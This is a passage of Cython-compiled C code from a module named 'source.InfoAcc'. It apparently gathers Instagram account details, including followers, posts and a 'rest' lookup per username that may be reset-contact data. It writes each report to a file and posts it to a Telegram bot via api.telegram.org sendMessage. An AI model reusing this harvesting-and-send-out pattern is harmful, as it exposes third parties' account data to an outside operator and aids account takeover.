        __pyx_t_1 = PyObject_RichCompare(__pyx_t_3, __pyx_int_10, Py_GE); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 625, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 625, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (__pyx_t_11) {
        } else {
          __pyx_t_10 = __pyx_t_11;
          goto __pyx_L13_bool_binop_done;
        }
        __pyx_t_1 = __Pyx_PyNumber_Int(__pyx_v_pp); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 625, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_3 = PyObject_RichCompare(__pyx_t_1, __pyx_int_2, Py_GE); __Pyx_XGOTREF(__pyx_t_3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 625, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 625, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_10 = __pyx_t_11;
        __pyx_L13_bool_binop_done:;
        if (__pyx_t_10) {

          
          __pyx_v_meta = 1;

          
          goto __pyx_L12;
        }

        
        /*else*/ {
          __pyx_v_meta = 0;
        }
        __pyx_L12:;

        
        goto __pyx_L9;
      }

      
      /*else*/ {
        __pyx_v_meta = 0;
      }
      __pyx_L9:;

      
    }
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    
    __pyx_t_5 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_5) {
      __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_6) < 0) __PYX_ERR(0, 631, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_6);

      
      __pyx_v_meta = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
    __pyx_L8_try_end:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_total); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 634, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_1 = __Pyx_PyInt_AddObjC(__pyx_t_6, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 634, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_total, __pyx_t_1) < 0) __PYX_ERR(0, 634, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(18); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = 0;
  __pyx_t_13 = 127;
  __Pyx_INCREF(__pyx_kp_u__71);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 37;
  __Pyx_GIVEREF(__pyx_kp_u__71);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__71);
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_total); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__72);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 9;
  __Pyx_GIVEREF(__pyx_kp_u__72);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__72);
  __pyx_t_3 = __Pyx_PyUnicode_FromBInt_int(__pyx_v_meta); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__73);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 13;
  __Pyx_GIVEREF(__pyx_kp_u__73);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__73);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_fows, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__74);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 9;
  __Pyx_GIVEREF(__pyx_kp_u__74);
  PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__74);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_pp, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__75);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 12;
  __Pyx_GIVEREF(__pyx_kp_u__75);
  PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u__75);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 9, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__76);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 9;
  __Pyx_GIVEREF(__pyx_kp_u__76);
  PyTuple_SET_ITEM(__pyx_t_1, 10, __pyx_kp_u__76);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 11, __pyx_t_3);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_gg, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 12, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__77);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 9;
  __Pyx_GIVEREF(__pyx_kp_u__77);
  PyTuple_SET_ITEM(__pyx_t_1, 13, __pyx_kp_u__77);
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_rest); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_2, __pyx_v_username) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_v_username);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_1, 14, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_https_www_instagram_com);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 34;
  __Pyx_GIVEREF(__pyx_kp_u_https_www_instagram_com);
  PyTuple_SET_ITEM(__pyx_t_1, 15, __pyx_kp_u_https_www_instagram_com);
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_13;
  __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_1, 16, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_RulerHuPagal);
  __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;
  __pyx_t_12 += 34;
  __Pyx_GIVEREF(__pyx_kp_u_RulerHuPagal);
  PyTuple_SET_ITEM(__pyx_t_1, 17, __pyx_kp_u_RulerHuPagal);
  __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_1, 18, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 635, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_ss = ((PyObject*)__pyx_t_6);
  __pyx_t_6 = 0;

  
  /*with:*/ {
    __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__78, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 648, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_9 = __Pyx_PyObject_LookupSpecial(__pyx_t_6, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 648, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_6, __pyx_n_s_enter); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 648, __pyx_L17_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 648, __pyx_L17_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __pyx_t_1;
    __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_14);
        /*try:*/ {
          __pyx_v_ff = __pyx_t_3;
          __pyx_t_3 = 0;

          
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ff, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 649, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_v_ss, __pyx_kp_u__5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 649, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
            }
          }
          __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_1);
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 649, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        goto __pyx_L26_try_end;
        __pyx_L21_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_6, &__pyx_t_1) < 0) __PYX_ERR(0, 648, __pyx_L23_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_6, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 648, __pyx_L23_except_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_2, NULL);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 648, __pyx_L23_except_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_10 = __Pyx_PyObject_IsTrue(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (__pyx_t_10 < 0) __PYX_ERR(0, 648, __pyx_L23_except_error)
          __pyx_t_11 = ((!(__pyx_t_10 != 0)) != 0);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_6);
            __Pyx_XGIVEREF(__pyx_t_1);
            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_6, __pyx_t_1);
            __pyx_t_3 = 0; __pyx_t_6 = 0; __pyx_t_1 = 0; 
            __PYX_ERR(0, 648, __pyx_L23_except_error)
          }
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          goto __pyx_L22_exception_handled;
        }
        __pyx_L23_except_error:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_14);
        goto __pyx_L1_error;
        __pyx_L22_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_14);
        __pyx_L26_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_9) {
          __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__33, NULL);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 648, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        }
        goto __pyx_L20;
      }
      __pyx_L20:;
    }
    goto __pyx_L30;
    __pyx_L17_error:;
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    goto __pyx_L1_error;
    __pyx_L30:;
  }

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_14, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_9);
    __Pyx_XGOTREF(__pyx_t_14);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_15, &__pyx_t_16);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_16);
        /*try:*/ {

          
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 653, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 653, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          
          __pyx_t_6 = PyTuple_New(6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 654, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_12 = 0;
          __pyx_t_13 = 127;
          __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
          __pyx_t_12 += 28;
          __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
          PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_https_api_telegram_org_bot);
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_token); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 654, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 654, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_13;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
          __Pyx_GIVEREF(__pyx_t_4);
          PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_4);
          __pyx_t_4 = 0;
          __Pyx_INCREF(__pyx_kp_u_sendMessage_chat_id);
          __pyx_t_12 += 21;
          __Pyx_GIVEREF(__pyx_kp_u_sendMessage_chat_id);
          PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_sendMessage_chat_id);
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ID); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 654, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 654, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_13;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
          __Pyx_GIVEREF(__pyx_t_2);
          PyTuple_SET_ITEM(__pyx_t_6, 3, __pyx_t_2);
          __pyx_t_2 = 0;
          __Pyx_INCREF(__pyx_kp_u_text_2);
          __pyx_t_12 += 6;
          __Pyx_GIVEREF(__pyx_kp_u_text_2);
          PyTuple_SET_ITEM(__pyx_t_6, 4, __pyx_kp_u_text_2);
          __Pyx_INCREF(__pyx_v_ss);
          __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_ss) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_ss) : __pyx_t_13;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_ss);
          __Pyx_GIVEREF(__pyx_v_ss);
          PyTuple_SET_ITEM(__pyx_t_6, 5, __pyx_v_ss);
          __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_6, 6, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 654, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_6, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 653, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L42_try_end;
        __pyx_L37_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        __pyx_t_5 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_5) {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L38_exception_handled;
        }
        goto __pyx_L39_except_error;
        __pyx_L39_except_error:;

        
